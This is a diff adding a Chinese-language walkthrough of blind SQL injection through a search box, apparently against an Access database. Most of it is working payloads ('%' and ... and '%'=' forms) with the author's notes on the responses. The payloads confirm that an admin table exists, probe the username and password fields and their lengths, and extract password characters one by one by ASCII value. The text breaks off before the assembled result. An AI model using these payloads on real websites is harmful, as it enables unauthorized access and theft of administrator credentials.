@@ -1,0 +1,62 @@
+
+
+
+判断搜索型注入，
+1%'and 1=1 and '%'=',提示结果.
+2010%'and 1=1 and '%'='代替了，这样结果利于判断。
+2010%'and 1=2 and '%'='，提示没有找到相关结果。很明显了。
+
+搜索型注入:
+
+一般搜索代码是这么写的：Select * from 表名 where 字段 like ’%关键字%’
+
+关键字=’ and [查询条件] and ‘%25’=’
+
+这样查询就变成
+
+select * from 表名 where 字段 like '%' and 1=1 and '%'='%'
+
+
+=========================================================
+我抓包后
+
+我提交的大概语句一下:
+
+2010%'and(select count(*)from mssysaccessobjects)>0 and '%'=' //返回正常。access数据库
+
+2010%'and(select count(*)from admin)>0 and '%'=' //返回正常非常幸运，存在admin表
+
+2010%'and(select count(username)from admin)>0 and '%'=' //返回正常,存在username字段
+
+2010%'and(select count(password)from admin)>0 and '%'=' //返回正常,并且存在password字段
+
+2010%'and(select top 1 len(username)from admin)>4 and '%'=' //返回正常username长度大于4
+
+2010%'and(select top 1 len(username)from admin)=5 and '%'=' //返回正常username长度等于5
+
+2010%'and(select top 1 len(password)from admin)=16 and '%'=' //返回错误，看来密码不是16位md5加密的，或者没加密，32位加密，或更高。
+
+2010%'and(select top 1 len(password)from admin)=32 and '%'=' //返回正常,看来应该是32位加密。
+
+猜密码了，不过用union联合爆记录不行，
+
+username length 5
+password length 32
+
+
+2010%'and(select top 1 asc(mid(username,1,1))from admin)=97 and '%'='   //a
+ 
+以下都是对应位置的ascii的编码，如果不是则返回错误。
+
+2010%'and(select top 1 asc(mid(password,1,1))from admin)=48 and '%'=',
+
+2010%'and(select top 1 asc(mid(password,2,1))from admin)=102 and '%'='
+
+2010%'and(select top 1 asc(mid(password,3,1))from admin)=101 and '%'='
+
+2010%'and(select top 1 asc(mid(password,4,1))from admin)=102 and '%'='
+
+通过得出的结果,以下是加起来的:
+
+
+
